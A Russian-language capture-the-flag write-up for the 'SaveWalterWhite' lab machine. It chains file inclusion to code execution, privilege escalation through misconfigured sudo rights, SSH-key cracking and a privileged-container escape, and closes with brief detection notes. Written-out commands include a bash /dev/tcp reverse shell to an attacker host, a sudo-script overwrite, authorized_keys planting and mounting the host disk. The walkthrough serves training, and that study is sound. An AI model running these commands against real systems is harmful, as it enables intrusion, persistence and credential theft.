# SaveWalterWhite: LFI → RFI и четыре лестницы подряд

**Таск:** SaveWalterWhite (aclabs.pro, сезон 6, 5 флагов)
**Цепочка:** LFI в `image.php` → RFI → RCE от www-data → перезаписываемый sudo-скрипт → Borg-бэкап с пассфразой в MySQL → authorized_keys через sudo → SUID + OSINT → privileged-контейнер.

## Футхолд

Открыты 22 и 80. В исходнике страницы комментарий: `image.php` принимает `?file=`. Чтение `/etc/passwd` подтверждает LFI и показывает трёх юзеров: walt, saul, jesse. Дальше читаться не даёт — перехожу к RFI по PayloadsAllTheThings: `cmd.php` на своём http.server, include через Burp — RCE от www-data.

Реверс-шелл завернуть в `bash -c` и URL-энкодить в Repeater — без этого дважды не взлетал.

## www-data → jesse

`sudo -l`: www-data может запускать от jesse `/opt/scripts/backup.sh`, и права у файла — 777. Перезапись и запуск:

```bash
echo "bash -c 'bash -i >& /dev/tcp/<ip>/5555 0>&1'" > /opt/scripts/backup.sh
sudo -u jesse /opt/scripts/backup.sh
```

## jesse → saul

В home jesse — `saul-back.tar`, внутри репозиторий Borg. Утилиты borg на машине нет, забираю по scp к себе и распаковываю там. `borg extract` просит пассфразу. Она в БД: в `/var/www/html` лежит `admin.php` с кредами root:root к базе `walter_fund`, из утилит на хосте только PHP:

```php
php -a
$db = new mysqli("db", "root", "root", "walter_fund");
$db->query("select * from donations");
```

Последняя запись в donations — пассфраза. Внутри архива ssh-ключ saul, зашифрован: ssh2john + rockyou, логин, флаг.

## saul → walter

`sudo -l` от saul — можно от walter. Классика с authorized_keys:

```bash
ssh-keygen -t rsa -N '' -f /tmp/walter
cat /tmp/walter.pub | sudo -u walter /usr/bin/tee -a /home/walter/.ssh/authorized_keys
```

## walter → root → хост

SUID-файл + подсказка с лёгким OSINT (имя Heisenberg) — root. Но вокруг контейнер: в `/dev` видны `sda`/`nvme`. Привилегированный режим — монтирую корень хоста, побег без эксплойта:

```bash
mkdir /mnt/host_root && mount /dev/sda1 /mnt/host_root
```

## Как поймать

Перезапись sudo-скрипта — 4688 на запись в `/opt/scripts` от www-data. Наполнение authorized_keys через sudo от чужого юзера — 4688 с `tee` в `.ssh`. Borg-архив, чья пассфраза лежит в соседней БД, — это уже ошибка проектирования: секрет должен быть рядом с тем, что защищает, а не в двух записях от него.

## Заметка

Машина — учебник по горизонтальному движению: ни одного эксплойта, каждая ступень — ошибка прав. `sudo -l` надо дёргать на каждом юзере, а не только на первом — права от jesse и от saul это разные права. И Borg-архив без пассфразы — просто tar с лишним шагом: пассфраза почти всегда лежит рядом с самим архивом.
